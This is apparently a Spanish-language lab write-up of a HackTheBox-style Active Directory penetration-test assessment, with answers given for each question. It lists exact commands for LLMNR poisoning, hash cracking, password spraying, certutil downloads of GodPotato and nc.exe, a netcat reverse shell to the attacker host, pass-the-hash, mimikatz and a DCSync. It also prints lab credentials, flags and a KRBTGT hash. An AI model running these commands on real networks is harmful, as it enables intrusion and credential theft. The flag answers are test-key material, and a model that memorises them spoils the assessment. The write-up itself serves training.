# Enumeración y Ataques de AD - Evaluación de Habilidades Parte II

## Escenario

>Nuestro cliente Inlanefreight nos ha contratado nuevamente para realizar una prueba de penetración interna de alcance completo. El cliente busca encontrar y remediar la mayor cantidad de fallas posibles antes de pasar por un proceso de fusión y adquisición. El nuevo CISO está particularmente preocupado por fallas de seguridad de AD más matizadas que pueden haber pasado desapercibidas durante pruebas de penetración anteriores. El cliente no está preocupado por tácticas evasivas o sigilosas y también nos ha proporcionado una máquina virtual Parrot Linux dentro de la red interna para obtener la mejor cobertura posible de todos los ángulos de la red y el entorno de Active Directory. Conéctese al host de ataque interno a través de SSH (también puede conectarse a él usando xfreerdp como se muestra al comienzo de este módulo) y comience a buscar un punto de apoyo en el dominio. Una vez que tenga un punto de apoyo, enumere el dominio y busque fallas que se puedan utilizar para moverse lateralmente, escalar privilegios y lograr comprometer el dominio.

>Aplique lo que aprendió en este módulo para comprometer el dominio y responda las preguntas a continuación para completar la parte II de la evaluación de habilidades.

## Preguntas

- **Obtenga un hash de contraseña para una cuenta de usuario de dominio que se pueda aprovechar para ganar un punto de apoyo en el dominio. ¿Cuál es el nombre de la cuenta?**
	- [x] **`AB920`**

>Enumeración inicial, identificamos a 3 Host en la red:

	172.16.7.3 - DC01
	172.16.7.50 - MS01
	172.16.7.60 - SQL1

>Todos pertenecientes a **Inlanefreight.local**.

![[IndentHosts.png]]

>Por lo que una forma rápida de obtener un hash de contraseñas es mediante el uso de la herramienta **Responder** envenenando la red a ver si podemos lograr algún intento de autenticación. Ejecutando el comando:

```shell
sudo responder -wf -I ens224
```

>Logramos obtener el Hash de contraseña del usuario **AB920**. Por lo que podemos intentar proceder a intentar crackear dicha contraseña, si llegará a ser débil, con **hashcat**.

![[AB920-Hash.png]]

- **¿Cuál es la contraseña de texto claro de este usuario?**
	- [x] **`weasal`**

>Utilizando **hashcat** con el siguiente comando:

```shell
hashcat hash /snap/seclists/rockyou.txt
```

>Logramos obtener la contraseña en texto claro del usuario **AB920**. 

![[AB920-Password.png]]

- **Envíe el contenido del archivo C:\flag.txt en MS01.**
	- [x] **`aud1t_gr0up_m3mbersh1ps!`**

>Con las credenciales obtenidas utilizamos **evil-winrm** para conectarnos a **MS01**, logrando ver el archivo **flag.txt**

- **Utilice un método común para obtener credenciales débiles para otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.**
	- [x] **`BR086`**

>En este punto intentamos distintas formas de obtener las credenciales, pero ninguna sin éxito, sin embargo en las notas de estudio se estipula que si tenemos una lista de usuarios y dichos usuarios al enumerar el dominio no cuentan con un limite de intento de inicio de sesión podríamos intentar un ataque de **Password Spraying** con contraseña débiles e intentar ver si alguna tiene éxito, por lo que primero obtengamos una lista de usuario.

>Esto se puede lograr de distintas formas, como con CrackMapExec, PowerView, y demás, nosotros aprovecharemos las credenciales que tenemos y nos conectaremos al DC mediante **rpcclient**, para buscar numerar los usuarios y luego implementando una **Regex**, poder filtrar el resultado.

```shell
rpcclient -U AB920%weasal 172.16.7.3 -c "enumdomusers" | awk -F'[][]' '{print $2}' > users.txt
```

>Este comando devuelve una lista de usuarios del dominio. Que podemos implementar ahora con **Kerbrute** para intentar realizar el ataque con contraseñas débiles y ver si alguna funciona. Primero veamos la política de Contraseñas.

![[Password-Policy-Dom.png]]

>Vemos que en términos de políticas de contraseña es muy débil por lo que podemos proceder con nuestro ataque sin problemas. Al buscar contraseñas débiles comunes en Google, conseguimos una lista que vamos intentando una a una (Buscamos una lista de contraseñas que más usa HackTheBox en sus Skills Assessments :D). Consiguiendo dar resultado con la siguiente:

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt Welcome1
```

>Consiguiendo la contraseña del Usuario **BR086**

- **¿Cuál es la contraseña de este usuario?**
	- [x] **`Welcome1`**

>Respuesta en la Pregunta Anterior.

- **Localice un archivo de configuración que contenga una cadena de conexión MSSQL. ¿Cuál es la contraseña del usuario que aparece en este archivo?**
	- [x] **`D@ta_bAse_adm1n!`**

>Al realizar una búsqueda con **crackmapexec** y **smbmap**, utilizando la credenciales recién descubiertas, descubrimos el archivo **Web.config** dentro de los recursos compartidos **Department Shares** de **DC01**.

![[Department-Shares.png]]

>Al confirmar que tenemos Permiso de Lectura podemos seguir listando y conseguir el archivo.

![[web.condifFile.png]]

>Con el siguiente comando podemos descargar el archivo:

```shell
smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A 'web.config'
```

>Para luego poder ver su contenido y conseguir las credenciales **`netdb:D@ta_bAse_adm1n!`**.

- **Envíe el contenido del archivo flag.txt en el Escritorio del administrador en el host SQL01.**
	- [x] **`s3imp3rs0nate_cl@ssic`**

>Con las credenciales que obtuvimos podemos intentar conectarnos al servidor **SQL01** con **mssqlclinet.py**, con las credenciales que obtuvimos. Procedemos a utilizar **`enable_xp_cmdshell`** para activar la ejecución de comandos. Luego con el comando **xp_cmdshell whoami /priv**, podemos verificar los privilegios de nuestra cuenta con lo que vemos lo siguiente:

![[seImpresonatePriv-Enable.png]]

>Al ver que contamos con el privilegio **SeImpersonatePrivilege**, hay muchas cosas que podemos hacer, de hecho si buscamos en Google. Vemos que podemos usar esto para derivar al uso de herramientas como **RoguePotato** o **PrintSpooffer** para escalar privilegios en la máquina, **SQL01**, por lo que podemos proceder de distintas formas, en nuestro caso utilizamos [**GODPOTATO**](https://github.com/BeichenDream/GodPotato).

>Descargamos **nc.exe** y **GodPotato-NET4.exe**, en nuestra máquina de atacante y aprovechando **xp_cmdshell** y **certutil**, descargaremos las herramientas la cual estaremos compartiendo en un servidor **HTTP** simple con python.

![[Simple-Python-Server.png]]

>Luego creamos un directorio **\temp**, donde podamos trabajar de forma cómoda, y dejar ahí las herramientas que descargaremos en **SQL01**. Luego con el siguiente comando:

```
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240/GodPotato-NET4.exe C:\temp\GodPotato.exe"
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240/nc.exe C:\temp\nc.exe"
```

>Descargamos las herramientas en el escritorio creado y confirmamos las descargas.

![[Herramientas-Descargadas.png]]

>Luego procedemos a la ejecución del comando para obtener una reverse shell con **GodPotato y nc.exe**, procedemos a iniciar una escucha con netcat en nuestra máquina de atacante, **`sudo nc -nlvp 443`**. Y ejecutando el siguiente comando:

```shell
xp_cmdshell C:\temp\GodPotato.exe -cmd "C:\temp\nc.exe -e cmd.exe 172.16.7.240 443"
```

>Logramos obtener la reverse shell:

![[reverse_shell_SQL01.png]]

>Con whoami, logramos verificar que somo **NT Authority\system**, por lo que ahora podremos acceder al directorio y ver la flag.

![[flagSQL01.png]]

- **Envíe el contenido del archivo flag.txt en el escritorio del administrador en el host MS01.
	- [x] **`exc3ss1ve_adm1n_r1ights!`**

>Para obtener la conexión con MS01, dado que somos usuarios privilegios en **SLQ01**, podemos intentar obtener los hashes para aplicar un ataque tipo **Pass-The-Hash**, esto se puede lograr de muchas formas, pero en este caso decidimos tomar un camino más rápido utilizando **msfvenom** para crear un **payload** que nos envíe una sesión **meterpreter** a nuestra máquina atacante y utilizar **hashdump** para obtener los hashes.

![[hashdumpSQL01.png]]

>Ahora podemos utilizar el hash de **Administrator** y conectarnos mediante **psexec** o **evil-winrm** a **MS01**, si tenemos éxito puede significar que ambos administradores tienen configurada la misma contraseña en ambos Hosts, lo cual es una falla dado que esta rehusando contraseña en distintos equipos, lo que facilita el compromiso de la red.

>Esto no funciona por lo que tomamos otras medidas y comenzamos a intentar encontrar las credenciales o hashes NTLM de otros usuarios que podamos usar para conectarnos **MS01** consiguiendo el hash NTLM de **mssqlsvc**, por lo general estas cuentas de servicios cuentas con privilegios elevados en algunos host, por lo que utilizamos una ataque del tipo **Pass-The-Hash**, con **psexec** para acceder a **MS01** con las credenciales de **mssqlsvc.**

![[Privilegios-SYSTEM-MS01.png]]

>Perfecto ahora estamos como **nt authority\system**, por lo que contamos con los privilegios necesarios para poder realizar una enumeración más profunda. Por lo que procedemos a realizar la transferencia de **mimikatz** y **powerview.ps1** al host, luego utilizando mimikatz intentamos ver contraseñas en texto claro con **sekurlsa::LogonPasswords**, pero no conseguimos nada.

>AS esto procedemos a intentar dumpear la **SAM** para lograr obtener los hashes NTLM, y tenemos exito.

![[Hash-NTLM-Administrator-MS01.png]]

>Al obtener el hash NTLM del usuario Administrador podremos conectarnos utilizando **Pass-The-Hash**. Esto, es extra, ya con System tenemos acceso total al hosts. Por lo que podemos ir a obtener la Flag en el escritorio de **Adminsitrator**

- **Obtenga credenciales para un usuario que tenga derechos GenericAll sobre el grupo de administradores de dominio. ¿Cuál es el nombre de cuenta de este usuario?**
	- [x] **`CT059`**

>En esta pregunta nos dan una pista que intentemos aplicar la misma forma que obtuvimos los primeras credenciales, es decir Responder, pero en este caso utilizaremos **Inveigh.ps1**, logrando obtener el HASH de **AB920** que ya teníamos y de **CT059**.

![[CT059-hash.png]]

- **Descifre el hash de contraseña de este usuario y envíe la contraseña en texto sin formato como respuesta.**
	- [x] **`charlie1`**

>Utilizamos Hashcat.

![[contraseña-CT059.png]]

- **Envíe el contenido del archivo flag.txt en el escritorio del administrador en el host DC01.**
	- [x] **acLs_f0r_th3_w1n!**

>Al enumerar con **Bloodhound-python**, vemos los permisos del usuario **CT059** vemos que este posee permisos **GenericAll** sobre el grupo **Domain Admins**, lo que le permite realizar cambios en el mismo. Por lo que primero, podemos usar sus credenciales para acceder a MS01 como dicho usuarios y añadirnos o crear un nuevo usuario que sea parte del grupo **Domain Admins**, por lo que procedemos a usar **psexec**.

>Esto no nos funciona por lo que procedemos a utilizar **xfreerdp** para conectarnos a **MS01** y realizar el proceso desde la consola, utilizando el siguiente comando:

![[Añadiendo-CT059.png]]

>Con esto podemos ahora ingresar a **DC01** importar **mimikatz** y realizar el proceso. 

```shell
net group "Domain Admins" CT059 /ADD /DOMAIN
```

>Una vez nos añadimos podemos utilizar **psexec.py** para ingresar a **DC01 - 172.16.7.3**.

![[Ultima-Flag.png]]

- **Envíe el hash NTLM para la cuenta KRBTGT para el dominio de destino después de lograr la vulneración del dominio.**
	- [x] **`7eba70412d81c1cd030d72a3e8dbe05f`**

>Una vez dentro del dominio, realizamos una transferencia de la herramienta **mimikatz** y realizamos el **DCSync** al usuario **KRBTGT**, obteniendo su hash NTLM.

![[hash-KRBTGT.png]]